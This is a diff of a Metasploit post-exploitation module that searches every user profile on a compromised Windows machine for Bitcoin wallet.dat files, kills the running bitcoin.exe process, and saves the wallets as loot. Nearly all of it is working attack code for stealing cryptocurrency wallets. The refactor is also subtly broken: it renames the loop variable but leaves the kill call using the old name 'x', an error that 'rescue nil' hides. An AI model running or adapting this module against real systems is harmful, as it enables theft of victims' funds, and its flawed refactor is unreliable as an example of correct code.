@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Post
   def run
     print_status("Checking All Users For Bitcoin Wallet...")
     grab_user_profiles().each do |user|
-      next if user['AppData'] == nil
+      next unless user['AppData']
       tmpath= user['AppData'] + "\\Bitcoin\\wallet.dat"
       jack_wallet(tmpath)
     end
@@ -37,10 +37,10 @@ class Metasploit3 < Msf::Post
 
   def jack_wallet(filename)
     data     = ""
-    return if not file?(filename)
+    return unless file?(filename)
 
     print_status("Wallet Found At #{filename}")
-    print_status("     Jackin their wallet...")
+    print_status("Jackin their wallet...")
 
     kill_bitcoin
 
@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Post
     end
 
     if data.empty?
-      print_error("     No data found")
+      print_error("No data found")
     else
       p = store_loot(
         "bitcoin.wallet",
@@ -62,15 +62,15 @@ class Metasploit3 < Msf::Post
         filename,
         "Bitcoin Wallet"
       )
-      print_status("     Wallet Jacked: #{p.to_s}")
+      print_status("Wallet Jacked: #{p.to_s}")
     end
   end
 
   def kill_bitcoin
-    client.sys.process.get_processes().each do |x|
-      if x['name'].downcase == "bitcoin.exe"
-        print_status("     #{x['name']} Process Found...")
-        print_status("     Killing Process ID #{x['pid']}...")
+    client.sys.process.get_processes().each do |process|
+      if process['name'].downcase == "bitcoin.exe"
+        print_status("#{process['name']} Process Found...")
+        print_status("Killing Process ID #{process['pid']}...")
         session.sys.process.kill(x['pid']) rescue nil
       end
     end
